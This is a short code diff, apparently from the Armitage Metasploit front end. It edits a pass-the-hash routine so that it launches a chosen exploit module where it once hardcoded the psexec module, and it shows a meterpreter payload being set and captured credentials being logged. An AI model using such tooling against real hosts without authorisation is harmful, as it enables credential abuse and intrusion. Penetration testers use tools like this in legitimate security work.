@@ -296,7 +296,7 @@ sub pass_the_hash {
 					%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
 				}
 				%options["RHOST"] = $host;
-				module_execute("exploit", "windows/smb/psexec", copy(%options));
+				module_execute("exploit", $module, copy(%options));
 			}
 			elog("psexec: " . [$user getText] . ":" . [$pass getText] . " @ " . join(", ", $hosts));
 		}
@@ -304,7 +304,7 @@ sub pass_the_hash {
 		if (!isShift($1)) {
 			[$dialog setVisible: 0];
 		}
-	}, \$dialog, \$user, \$domain, \$pass, \$reverse, \$hosts, \$brute, \$model)];
+	}, \$dialog, \$user, \$domain, \$pass, \$reverse, \$hosts, \$brute, \$model, \$module)];
 
 	$b2 = [new JPanel];
 	[$b2 setLayout: [new BorderLayout]];
